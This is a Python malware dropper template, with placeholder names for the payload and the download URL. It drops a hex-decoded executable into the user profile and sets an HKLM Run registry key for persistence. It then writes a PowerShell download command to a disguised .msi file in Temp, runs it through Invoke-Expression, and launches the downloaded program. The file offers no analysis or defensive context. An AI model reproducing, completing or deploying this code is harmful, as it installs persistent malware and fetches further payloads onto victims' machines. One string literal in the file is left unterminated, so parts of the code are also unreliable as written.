#Imports
import os
import subprocess
from pathlib import Path
import binascii


sigInstallerName = "INSTALLERNAMEHERE"
ProdName = "ProductName"
GetUser = (os.environ['USERPROFILE'])
MessingWithHashin = "RANDOPADDDING"
installPath = ''.join((GetUser,"sigInstallLocation\"))
ProgName = 'sigFileName' # The main malware



Path(installPath).mkdir(parents=True, exist_ok=True)

fullPath = ''.join((installPath, ProgName, ".exe"))


#For User
#os.system(r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "'+ProdName+'" /t REG_SZ /F /D "'+fullPath+'"')


#For system
subprocess.Popen(r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "'+ProdName+'" /t REG_SZ /F /D "'+fullPath+'" /reg:64', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


mainProgCode = binascii.unhexlify("RAWCODETOREPLACE")

f = open(fullPath, 'wb')
f.write(mainProgCode)
f.close()


url = 'DOWNLOADLINK'
DownloadPath = ''.join((GetUser, "\AppData\Local\Temp\\", sigInstallerName, ".exe"))
DownloaderCommand = (r'Invoke-WebRequest '+url+' -MaximumRedirection 10 -outfile "'+DownloadPath+'"; "'+DownloadPath+'"')
DownloaderPath = ''.join((GetUser, "\AppData\Local\Temp\\"+"~"+sigInstallerName+".msi"))
f = open(DownloaderPath, "a")
f.write(DownloaderCommand)
f.close()
p= subprocess.Popen('powershell get-content "'+DownloaderPath+'" | powershell Set-Variable ProgressPreference SilentlyContinue ; Invoke-Expression ', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
p.communicate()
os.startfile(DownloadPath)